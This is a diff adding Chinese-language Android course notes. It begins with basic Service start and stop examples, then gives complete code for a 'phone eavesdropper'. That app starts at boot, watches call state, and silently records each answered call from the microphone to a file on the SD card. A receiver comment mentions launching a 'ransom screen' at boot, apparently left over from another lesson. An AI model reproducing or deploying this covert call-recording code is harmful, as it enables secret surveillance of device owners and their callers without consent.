@@ -2318,3 +2318,199 @@ http://www.android-doc.com/guide/components/processes-and-threads.html
 		拥有任何活动的组件(Activity/Service)的进程
 
 
+/**
+ 
+ */
+
+服务的启动和关闭
+    
+    服务手动关闭不会被重启
+
+	//启动服务
+	public void click7(View v) {
+        Intent intent = new Intent(this, MyService.class);
+        startService(intent);
+    }
+
+    //服务关闭
+    public void click8(View v) {
+        Intent intent = new Intent(this, MyService.class);
+        stopService(intent);
+    }
+
+/*******************************************************/
+
+    <service android:name=".MyService"></service>
+
+
+
+	public class MyService extends Service {
+	    @Nullable
+	    @Override
+	    public IBinder onBind(Intent intent) {
+	        return null;
+	    }
+
+	    //服务创建
+	    @Override
+	    public void onCreate() {
+	        super.onCreate();
+	    }
+
+	    //服务销毁
+	    @Override
+	    public void onDestroy() {
+	        super.onDestroy();
+	    }
+
+	    //服务开始
+	    @Override
+	    public int onStartCommand(Intent intent, int flags, int startId) {
+	        return super.onStartCommand(intent, flags, startId);
+	    }
+
+	}
+
+/**
+ 
+ */
+
+电话窃听器
+
+	开机启动
+
+	用户接到来电，一旦接听，立即开始录音，电话挂掉，录音结束，生成音频文件
+
+	*电话的状态
+		*空闲
+		*响铃
+		*摘机
+
+    /*************************************************************************/
+
+    public void click9(View v) {
+        Intent intent = new Intent(this, CallService.class);
+        startService(intent);
+    }
+
+    /*************************************************************************/
+
+        <uses-permission android:name="android.permission.READ_PHONE_STATE"></uses-permission>
+        <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
+ 		<uses-permission android:name="android.permission.RECORD_AUDIO" />
+        
+        <service android:name=".CallService"></service>
+
+	//录音功能
+
+	http://www.android-doc.com/guide/topics/media/audio-capture.html
+
+    /*************************************************************************/
+
+	public class CallService extends Service {
+	    private MediaRecorder mRecorder;
+	    @Nullable
+	    @Override
+	    public IBinder onBind(Intent intent) {
+	        return null;
+	    }
+
+	    @Override
+	    public void onCreate() {
+	        super.onCreate();
+	        //获取电话管理器，用于监听电话状态
+	        TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
+	        //events:设置电话侦听器只侦听电话状态的改变
+	        tm.listen(new MyListener(), PhoneStateListener.LISTEN_CALL_STATE);
+
+	    }
+
+
+
+	    class MyListener extends PhoneStateListener {
+
+	        //电话状态一旦改变，此方法调用
+	        @Override
+	        public void onCallStateChanged(int state, String incomingNumber) {
+	            super.onCallStateChanged(state, incomingNumber);
+	            switch (state) {
+	                //空闲状态
+	                case TelephonyManager.CALL_STATE_IDLE:
+	                    if (mRecorder != null) {
+	                        mRecorder.stop();
+	                        mRecorder.release();
+	                        mRecorder = null;
+	                    }
+	                    break;
+	                //响铃状态
+	                case TelephonyManager.CALL_STATE_RINGING:
+	                    if (mRecorder == null) {
+	                        mRecorder = new MediaRecorder();
+	                        mRecorder = new MediaRecorder();
+	                        mRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
+	                        mRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
+	                        mRecorder.setOutputFile("sdcard/voice.3gp");
+	                        mRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
+
+	                        try {
+	                            mRecorder.prepare();
+	                        } catch (IOException e) {
+	                            e.printStackTrace();
+	                        }
+	                    }
+	                    break;
+	                //摘机状态
+	                case TelephonyManager.CALL_STATE_OFFHOOK:
+	                    if (mRecorder != null) {
+	                        mRecorder.start();
+	                    }
+	                    break;
+	            }
+	        }
+	    }
+	}
+
+    /*************************************************************************/
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+
+
+        <receiver android:name=".BootRecevier">
+            <intent-filter >
+                <action android:name="android.intent.action.BOOT_COMPLETED"/>
+            </intent-filter>
+        </receiver>
+
+
+	public class BootRecevier extends BroadcastReceiver {
+	    @Override
+	    public void onReceive(Context context, Intent intent) {
+	        //开机启动勒索界面
+	        Intent intent1 = new Intent(context, CallService.class);
+	        //设置新的任务栈
+	        intent1.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+	        //在上下文之外调用startActivity需要上面的标记
+	        context.startService(intent1);
+	    }
+	}
+
+/**
+ 
+ */
+/**
+ 
+ */
+/**
+ 
+ */
+
+
+
+
+
+
+
+
+
+
+
+
